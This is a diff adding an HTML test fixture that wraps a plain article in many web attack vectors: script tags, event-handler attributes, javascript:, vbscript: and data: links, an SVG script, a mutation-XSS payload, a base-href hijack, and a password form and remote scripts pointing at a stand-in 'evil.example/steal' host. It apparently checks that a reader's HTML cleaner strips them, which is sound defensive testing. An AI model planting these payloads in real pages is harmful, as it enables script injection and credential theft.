@@ -1,0 +1,42 @@
+<!doctype html>
+<!-- Everything a page could try to smuggle into the reader, around a real article. -->
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>A hostile page</title>
+<base href="https://evil.example/steal/">
+<meta http-equiv="refresh" content="30; url=https://evil.example/steal">
+<link rel="stylesheet" href="https://evil.example/steal.css">
+<style>body { background: url(https://evil.example/steal.png) }</style>
+<script>alert("head")</script>
+</head>
+<body onload="alert('body')">
+<article>
+  <h1 onclick="alert('title')">A hostile page</h1>
+  <p>The honest paragraph survives every step of the cleaning, because it is the article itself: a long stretch of plain text that tells the reader something worth reading. It goes on for a while so that the extractor has no doubt this is the content of the page and not its navigation or its footer.</p>
+  <p style="position:fixed;inset:0;background:red" class="fixed inset-0 z-50" onmouseover="alert('p')" id="settings">A second paragraph tries to cover the window with a style attribute and an app class, and to take the id of an element the app has. It also carries a handler for the mouse. Only its words should remain.</p>
+  <script>alert("inline")</script>
+  <script src="https://evil.example/steal.js"></script>
+  <noscript><img src="https://evil.example/steal/noscript.png"></noscript>
+  <iframe src="https://evil.example/steal/frame" srcdoc="<script>alert('srcdoc')</script>"></iframe>
+  <object data="https://evil.example/steal.swf"></object><embed src="https://evil.example/steal.swf">
+  <form action="https://evil.example/steal/form"><input name="password" type="password" autofocus onfocus="alert('focus')"><button formaction="https://evil.example/steal/button">Log in</button></form>
+  <p>Pictures: <img src="https://cdn.example.org/diagram.png" alt="Diagram" onerror="alert('img')" width="600" height="300">
+    <img src="http://tracker.example/pixel.gif" alt="Plain http" width="600" height="300">
+    <img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+" alt="Data" width="600" height="300">
+    <img src="javascript:alert('src')" alt="Script" width="600" height="300"></p>
+  <svg width="600" height="300"><script>alert("svg")</script><a href="javascript:alert('svg-link')"><text>Click</text></a></svg>
+  <math><mtext><style><img src=x onerror="alert('mxss')"></style></mtext></math>
+  <p>Links: <a href="javascript:alert('link')">a script link</a>, <a href="https://example.org/source" target="_blank" ping="https://evil.example/steal/ping">the source</a>,
+    <a href="vbscript:msgbox(1)">an old one</a>, <a href="data:text/html,<script>alert(1)</script>">a data link</a>, a footnote<a href="#note-1">¹</a>,
+    and <a href="//other.example/page" onclick="alert('a')">a protocol-relative one</a>.</p>
+  <video src="https://evil.example/steal.mp4" autoplay></video><audio src="https://evil.example/steal.mp3" autoplay></audio>
+  <details open ontoggle="alert('toggle')"><summary>More</summary><p>Folded text stays as text.</p></details>
+  <div data-tauri-invoke="open_url_external" data-bind="alert(1)">A div that names an app command in a data attribute.</div>
+  <template><img src=x onerror="alert('template')"></template>
+  <p id="note-1" name="note-1">¹ The footnote the link points to. Its id is renamed so it cannot clobber anything.</p>
+  <p>The last paragraph closes the article with another stretch of ordinary words, so that whatever the extractor decides about the noise above, the text around it is clearly the main content of the page and gets kept.</p>
+</article>
+<script>document.write("<p>written by script</p>")</script>
+</body>
+</html>
